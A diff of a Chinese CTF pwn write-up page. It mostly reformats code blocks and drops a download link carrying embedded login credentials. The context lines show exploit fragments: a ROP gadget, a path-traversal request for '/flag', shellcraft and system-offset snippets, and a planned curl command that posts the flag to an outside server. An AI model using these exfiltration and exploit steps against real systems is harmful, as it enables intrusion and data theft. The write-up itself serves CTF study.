@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -297,13 +297,12 @@
 <p><code>main</code>函数就一个简单直接的栈溢出，但是<code>got</code>表被清空，没完全清空，还剩下<code>__libc_start_main</code>。后面的<code>stdout</code>和<code>stdin</code>也都在数据段上。</p>
 <h4 id="利用思路">利用思路</h4>
 <p>清空了<code>got</code>表，考虑使用<code>ret2syscall</code>，发现程序中有<code>syscall; ret</code>。这里主要是利用了一个<code>gadget</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x000000000040075c: mov eax, 0; leave; ret;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x000000000040075c: mov eax, 0; leave; ret;</span></span></code></pre></td></tr></table>
 </div>
 </div><p>结合<code>end2</code>函数，正好可以泄露出<code>libc</code>地址后，执行构造<code>syscall</code>调用<code>read</code>函数，再重新给<code>got</code>表填上。最终思路为：</p>
 <ul>
@@ -321,7 +320,7 @@
 </li>
 </ul>
 <h4 id="exp">EXP</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -452,8 +451,7 @@
 </span></span><span class="line"><span class="cl">    <span class="mi">8</span><span class="p">:</span> <span class="p">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x045390</span><span class="p">]</span><span class="o">*</span><span class="mi">6</span> <span class="c1"># system</span>
 </span></span><span class="line"><span class="cl"><span class="p">}))</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>远程打：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212214326396.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212214326396.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212214326396.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212214326396.png 2x" sizes="auto" data-title="image-20220212214326396" data-alt="image-20220212214326396" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -471,7 +469,7 @@
 <h4 id="利用思路-1">利用思路</h4>
 <p>漏洞点很简单，关键是需要构造好报文，然后可以触发<code>submit</code>中的栈溢出漏洞。</p>
 <p>分析出报文的组成为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -498,8 +496,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">uint16_t</span> <span class="n">flag1</span><span class="p">;</span> 	<span class="c1">// 可控制submit函数的分支
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">uint16_t</span> <span class="n">flag2</span><span class="p">;</span> 	<span class="c1">// 当type为6时，必须为0xffff
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">char</span> <span class="n">data</span><span class="p">[];</span>		<span class="c1">// 数据
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>计算校验和就是把整个报文加上一个<code>fakeipheadfa</code>，每两个字节取整数，然后异或，最后得到的值填充到<code>check_sum</code>。</p>
 <p>因此，利用思路总结如下：</p>
@@ -510,7 +507,7 @@
 <li>使用<code>libc</code>中的<code>gadgets</code>，用<code>orw</code>拿<code>flag</code></li>
 </ul>
 <h4 id="exp-1">EXP</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -727,8 +724,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)))</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>远程打：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212224448669.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212224448669.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212224448669.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212224448669.png 2x" sizes="auto" data-title="image-20220212224448669" data-alt="image-20220212224448669" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -749,7 +745,7 @@
 <li><code>exit(0) --&gt; _IO_flush_all_lockp ---&gt; IO_OVERFLOW</code>调用链完成利用。<code>libc</code>版本不高，这里我使用的是<code>_IO_str_finish</code>。</li>
 </ul>
 <h4 id="exp-2">EXP</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -932,8 +928,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cat flag&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>远程打：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232939711.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232939711.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232939711.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232939711.png 2x" sizes="auto" data-title="image-20220212232939711" data-alt="image-20220212232939711" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -959,17 +954,16 @@
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214203755071.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214203755071.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214203755071.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214203755071.png 2x" sizes="auto" data-title="image-20220214203755071" data-alt="image-20220214203755071" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h4 id="利用思路-3">利用思路</h4>
 <p>对于漏洞<code>1</code>，直接发送：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;GET /../flag\r\n\r\n&#34;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;GET /../flag\r\n\r\n&#34;</span></span></code></pre></td></tr></table>
 </div>
 </div><p>对于其他漏洞的思路：</p>
 <p>首先分析出对应的结构体为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -996,11 +990,10 @@
 </span></span><span class="line"><span class="cl">		
 </span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="n">unit</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="n">data</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>处理流程梳理：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1027,8 +1020,7 @@
 </span></span><span class="line"><span class="cl">	0x12:
 </span></span><span class="line"><span class="cl">		pass
 </span></span><span class="line"><span class="cl">	0x22: addr1 == &#34;ping&#34; strlen(&amp;addr2) &lt;= 0xf
-</span></span><span class="line"><span class="cl">		show msg
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">		show msg</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后，总结思路如下：</p>
 <ul>
@@ -1038,7 +1030,7 @@
 <li>构造报文，使远程执行命令<code>system(&quot;curl -X POST -F \&quot;flag=@/flag\&quot; ip:port&quot;)</code>，这里的<code>ip:port</code>，可以是公网服务器的地址和监听端口，或者在<code>buuoj</code>上用小号去<code>linux basic</code>开个机器（这里没法用<code>bash</code>反弹<code>shell</code>，<code>buu</code>之前修改规则。但是检测到有<code>curl</code>，因此可利用该命令输出<code>flag</code>）</li>
 </ul>
 <h4 id="exp-3">EXP</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1209,8 +1201,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">get_msg</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>远程打，利用漏洞<code>1</code>：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214204403196.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214204403196.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214204403196.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214204403196.png 2x" sizes="auto" data-title="image-20220214204403196" data-alt="image-20220214204403196" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -1230,7 +1221,7 @@
 <h4 id="利用思路-4">利用思路</h4>
 <p>题目贴心的给出了需要的<code>gadgets</code>，那么直接创建<code>socket</code>，反向连接公网服务器即可。做这题的时候我在本地重新编译了一份。</p>
 <h4 id="exp-4">EXP</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-10"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1415,8 +1406,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Hello,Do You Like Bing Dwen Dwen?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>远程打：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214231914827.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214231914827.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214231914827.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220214231914827.png 2x" sizes="auto" data-title="image-20220214231914827" data-alt="image-20220214231914827" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -1438,7 +1428,7 @@
 <li>触发一个<code>assert</code>，我选择的是<code>largebin chunk</code>入链时的<code>assert(chunk_is_main_arena(p))</code>，此时会打印出<code>flag</code></li>
 </ul>
 <h4 id="exp-5">EXP</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-11"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
@@ -1651,8 +1641,7 @@
 </span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>远程打：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220216233742463.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220216233742463.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220216233742463.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220216233742463.png 2x" sizes="auto" data-title="image-20220216233742463" data-alt="image-20220216233742463" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
